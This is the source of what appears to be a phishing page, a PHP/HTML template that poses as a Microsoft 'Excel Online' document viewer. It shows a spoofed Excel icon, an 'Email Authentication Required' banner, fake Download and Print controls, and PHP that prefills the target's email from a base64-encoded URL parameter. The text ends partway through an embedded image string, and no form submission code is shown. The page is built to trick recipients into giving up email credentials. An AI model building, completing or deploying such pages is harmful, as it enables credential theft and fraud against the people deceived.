<?php

$user = $_REQUEST['email'];
$email = base64_decode($user);
if($_REQUEST['log'] == 1){$log=1;$email = $_REQUEST['email'];}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Excel Online</title>
<link rel="short icon"
       href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAANL0lEQVR42u3dX4hcZxnH8Td3CfkDG2q27B8LO7CQbbeloCRtLXhhY3pVGzUXNiCYYIstWBMrKDRtIlSwGr0IUnUVhNaL2lp7Zaw3AbWmKF6kaQqFDViTQBQMNobmTvcZs9vJuGd3zm/mnfM8+34/N82SbGay5fmeM+8758y6ycc/8Z8EoEjrCABQLgIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAIAFIwAAAUjAEDBCABQMAKAVe1ozaaJkZvTxNbRdM/0nQu/Hm3/+sNfua/pp4Y+EQAs2T42lWbGWv836FUIQHwEoEA26DbcM+OtNDM5lW7ZOtYe/LoIQHwEYA0bH9nWPoLvbN3R16BXIQDxEYA1oHPQJ24abQ/6ztbt2R+XAMRHAALZvH7jwmn7B6/TZyenhzLoVQhAfATAoeUGfWbhdfuWDZuafmo3IADxEYCGVW2xRUAA4iMAQxJ50KsQgPgIwIANaostAgIQHwEQ2cq7DXYJg16FAMRHAFbR1BZbBAQgPgJwXefK+8xki0HvAQGIr7gARNlii4AAxLemA9C98s6gDxYBiG9NBGAtbrFFQADiCxWA7i222bFpBr1BBCA+lwEoaS89MgIQX6MBYIstNgIQ39AD8OVd+9qv0xn0+AhAfEMPwIuPfZfhXyMIQHwEADICEB8BgGy5ALz7vd82/bTCOjV/Ou2fO5yuXLs6tMckAJARgMGzCOw9fmhoj0cAICMAeQzzpRUBgIwA5EEAEAIByIMAIAQCkAcBQAgEIA8CgBAIQB4EACEQgDwIAEIgAHkQAIRAAPIgAAjBy7UAVdHx8PyUIBIAhOBhwAwB0BEAyDwMmCEAOgIAmYcBMwRARwAg8zBghgDoCABkHgbMEAAdAYDMw4AZAqAjAJB5GDBDAHQEADIPA2YIgI4AQOZhwAwB0BEAyDwMmCEAOgIAmYcBMwRARwAg8zBghgDoCABkHgbMEAAdAYDMw4AZAqAjAJB5GDBDAHQEADIPA2YIgI4AQOZhwAwB0BEAyDwMmCEAOgIAmYcBMwRARwAg46ageRAAhEAA8iAACIEA5EEAEAIByIMAIAQCkAcBQAgEIA8CULgr166msxfOLX3918sX0vl/XFr6+uzFc+nInkfT+Mi2Rp+nh202wzagjgA07MBPnkrvvf/v9lDbf3thPz/7OTbNw4AZAqAjAKt4Y/7NpV9fvvavdPbd+TTxodG09yO7+/67T7z1+/TFuSO1v+8Xjx1LO1qzTf9oXAyYIQC64gNw7Nc/S6fmTy993euR+K1v/SptXr+xr8e2o/9rZ16v9T0TW0fT608+38wPq4uHATMEQFd8AF7884n01Rfqn05/56FDfZ0FXLj893TX0YeG/riD5GHADAHQFR8Ac9s3Huz59feimbFWOvHEc/Jj2pnH91+rdyT3dPQ3HgbMEAAdAUjaMJo/Hn5BXom/+5v70vl/Xqr1PZ6O/sbDgBkCoCMAST8df3zXvnTw/s/X/j5l8W/Lhk0LwXm+73WHQfIwYIYA6AjAdQd//u300p/q/c9ST8mVxT81Njl5GDBDAHQE4Lq3L55Ln3z24drf95snfpi2j031/OeVsw2PR3/jYcAMAdARgA57jx+6YUuwF5/56H3p2Oe+1vOff/qXP0g//d0rWR9jWDwMmCEAOgLQ+dyELUE7Op95pveBVnYc+llszMnDgBkCoCMAXZTV+R8deCrtvvVjq//bhcB4PfobDwNmCICOAHSZO/lyOvpqvf39Xbfdneb2r76qr7zE8Hr0Nx4GzBAAHQHoYlfi3XV0X+3T9NXeGqws/nm56KeKhwEzBEBHAJahbAmu9iYdZfHPy0U/VTwMmCEAOgKwDOVovdpbg+su/nk/+hsPA2YIgI4AVBjk63Vl8a/XhcUmeRgwQwB0BKCC3Qfgs8cP1vqeqnfr1Y2Jt4t+qngYMEMAdARgBXW3BJcbXOXlhLeLfqp4GDBDAHQEYKXnKpy6d781uO7iX5Sjv+GmoHkQACeULcHON+4o33/4gUfSgY9/uul/ek8IQB4EwJG69wrofGtw3TMIrxf9VCEAeRAAR5TX8Isr+LuffSSdvTjf8/d5vOR3JQQgDwLgTN03Btlbgw8tDHKdy4ujHf0NAciDADijbAlaBOrc9MPzRT9VCEAeBMAh5Y1BdXi+6KeKh202wzagjgD0+rzF24f3IuLR33gYMEMAdASgBuVeAb2IePQ3HgbMEAAdAahBvX34SiJc9FPFw4AZAqAjADXYG3tu/fqnBvp3er/kdyUeBswQAB0BqEm5V0CVyEd/42HADAHQEYCa1A8RWU6ES35X4mHADAHQEQDBILYEI130U8XDgBkCoCMAAuWjvbpFueR3JR4GzBAAHQEQ9bsluNpNRCPwMGCGAOgIgGAQ6wCRLvut4mHADAHQEQDBIHYCWAMYHAKgIwA1DXIXIPo6gIcBMwRARwBqGuT7AKKfBXgYMEMAdASgBvVTg1YS+SzAw4AZAqAjADVwLcCNPAyYIQA6AtCjHEf/RVGvB/AwYIYA6AhAj3Ic/RdFPQvwMGCGAOgIQA9yHv0XRTwL8DBghgDoCEAvz7nm3YDq3g9w8Xvm9vf39uJh8zBghgDoCEAP6r7t1z4d6McnX6q9XRjtzkDcFDQPAuBI3aP/4seEK3cSjnZvQAKQBwFwpO7Rv3NfX7lgKNJZAAHIgwA40e9He82dfDkdffW5Wo8Z6SyAAORBAJyoewT/wr0Ppqf3fGnpa+UegpE+IYgA5EEAHFBewy93+q5cOxDlMwIJQB4EwIG6t/2qejOPEpIoZwEettkM24A6ArAMZWhXuqhHWQyMcBbgYcAMAdARgGXUPfrbEfvMM69U/r6yGBjhUmEPA2YIgI4AdFGO/qsdrdUPFPF+qbCHATMEQEcAuiiLdr3s3St/r/ezAA8DZgiAjgB0UG731et7+JUzC+P5LMDDgBkCoCMAHZSjdJ1P91EWAz2fBXgYMEMAdATgOuXoX3c4lcVA4/VSYQ8DZgiAjgBcN4w37KiLgV5vGOJhwAwB0BGApA+m8uk+6l2FPZ4FeBgwQwB0BCBpt/tSL9pRFwM9ngV4GDBDAHTFB0C93Vc/R2T1cwW9XSrsYcAMAdAVHwDl6N/vyry6GOjtUmEPA2YIgK7oAKhH/3735tU1B+PpLMDDgBkCoCs6AMrRf1BX6qmLgZ7OAjwMmCEAuqIDoLwWH9QAqouBRtl9yMHDgBkCoCs6AIvsTUCdIXjzb+/c8LKg88rAI3seTdvHpgbyuOpioJdLhT0MmCEAOgLQIHUx0MsNQzwMmCEAOgLQIFsMPHvh3NLXf3jnL0u/fu/9hd+7OL/09fnLl244W/BwFuBhwAwB0BGAoOxlS9O7AR4GzBAAHQGAjJuC5kEAEAIByIMAIAQCkAcBQAgEIA8CgBAIQB4EACEQgDwIAELwsM1m2AbUEQDIPAyYIQA6AgCZhwEzBEBHACDzMGCGAOgIAGQeBswQAB0BgMzDgBkCoCMAkHkYMEMAdAQAMg8DZgiAjgBA5mHADAHQEQDIPAyYIQA6AgCZhwEzBEBHACDzMGCGAOgIAGQeBswQAB0BgMzDgBkCoCMAkHkYMEMAdAQAMg8DZgiAjgBA5mHADAHQEQDIPAyYIQA6AgCZhwEzBEBHACDzMGCGAOgIAGTcFDQPAoAQCEAeBAAhEIA8CABCIAB5EACEQADyIAAIgQDkQQAQAgHIgwAgBAKQBwFACAQgDwKAEAhAHgQAIRCAPAgAQiAAg3dq/nTae/zQ0B6PAEBGAAbLhn//3OF05drVoT0mAYDMw9V26A8BgIwAxDf0ADz5wMPp/tvvTRNbR5v+t6NPBCC+oQeg047WbJoYuTnNjE+l2cnpNDM2lbZs2NT0zwQ9IgDxNRqA5Wxev7EdhJmxVvssgTD4RQDicxeAKoth2Nm6I03cNJpu2TrGWkLDCEB8YQJQZXxkW/tMgTAMHwGIL3wAqmxfeNkwMTK6cNbQSjOTU+0w2MsKDA4BiG/NBqBKdxhmx6bZkRARgPiKC0CVxR0Ji8E903e2I0EYVkYA4iMAq+gOAzsSHyAA8REAAVuV/0MA4iMAA9QZhpnJ1prfkSAA8RGAIVirW5UEID4C0CALQ/tsIehWJQGIjwA4FOU9DAQgPgIQiLetSgIQHwFYA5oKAwGIjwCsUcPYqiQA8RGAwiwXBnVHggDERwDQpmxVEoD4CABW1BmG7h0JAhAfAYDEtirfvniu6aeBPhEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKRgCAghEAoGAEACgYAQAKtq7pJwCgOQQAKNh/AQpPFvc3RPXyAAAAAElFTkSuQmCC">


</head>

<style>
html { 
  background: url(pobg.gif) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 708px;
    width: 1344px;
	margin-right:0px;
    background-color: rgba(0,0,0,0.6);
    z-index:0;
}

/* Center the loader */
#loader {
  position: absolute;
  left: 50%;
  top: 50%;
  z-index: 1;
  margin: -75px 0 0 -75px;
  border: 18px solid #114B7B;
  border-radius: 50%;
  border-top: 18px solid #409FBF;
  width: 60px;
  height: 60px;
  -webkit-animation: spin 0s linear finite;
  animation: spin 0s linear finite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  0% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  0% { transform: rotate(360deg); }
}
/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 0s

}

@-webkit-keyframes animatebottom {
  from { bottom:-200px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}


}

#myDiv {
  display: none;
  text-align: left;
  border:#FFF;
}

input { border:solid 1px #999;
}
input:focus { border:#112F18 solid 1px;
	          border-right:none;
		      border-left:none;
		      border-top:none;
}

.sub{ background:#112F18;
      }
.sub:hover{ background:#2C613D;
      }
	  placeholder { color:#666;
	  }
</style>

<body topmargin="0" leftmargin="0" rightmargin="0" onload="myFunction()" >


<div align="left" style="background:#282828; width:1344px; color:#FFF; font-family:Segoe UI; border:none; padding:0; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<table width="1354" cellspacing="0"  cellpadding="0">
<tr>
<td width="45" bgcolor="#29703B" style="padding:3px;">
 <img src="data:image/png;base64,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" width="37" height="32" /></td>
<td width="126" bgcolor="#29703B">
Excel Online
</td>
<td width="737">
</td>
<td width="191">
</td>
<td align="center" width="58" style="color:#CCC; font-size:12px;">
<a href="#" style="text-decoration:none; color:#ccc;">Email Authentication Required</a>&nbsp; |
</td>
<td width="102" style="color:#CCC; font-size:12px;"><a href="#" style="text-decoration:none; color:#ccc;">create account</a>
</td>
<td width="79">
</td>
</tr>
</table>

<table width="1354" cellspacing="0" bgcolor="#FFFFFF">
<tr style="color:#333; padding:8px; border:#999 solid 1px;">
<td width="18" style="padding:10px;">
</td>
<td width="170"style="padding:5px;" >Document
</td>
<td width="678">
</td>
<td width="82">
</td>
<td align="center" width="134" style="font-size:13px; color:#999;">&nbsp;&nbsp;<a href="#" style="text-decoration:none; color:#999;">Download &nbsp;</a><font color="#990000" size="3"><a href="#" style="text-decoration:none; color:#990000; cursor: wait;">&dArr;</a></font>&nbsp;</td>
<td align="left" width="81" style="font-size:13px;"><a href="#" style="text-decoration:none; color:#333; cursor:help;">Open with</a>&nbsp;&equiv;&nbsp;
</td>
<td align="center" width="91" style="font-size:13px;">
<a href="#" style="text-decoration:none; color:#333;">Print</a> &nbsp; </td>
<td width="82">
</td>
</tr>
</table>
</div>
<div class="cover"></div>

<div id="loader"><br>
<br>
<br>
<br>


</div>
<div align="center"><br>
<br>
<br>
<br>
<br>
<br>
<br>


<div align="left" style="display:non; padding:5px; box-shadow:-0px 0px 4px #888888; font-size:15px; background:#FFF; border:solid 1px #EEE; width:520px; font-family:Tahoma; color:#666;" id="myDiv" class="animate-bottom">
<div align="left" style="background:#29703B; padding:5px;">
<table width="222" cellspacing="0">
<tr>
<td width="40">
<img src="data:image/png;base64,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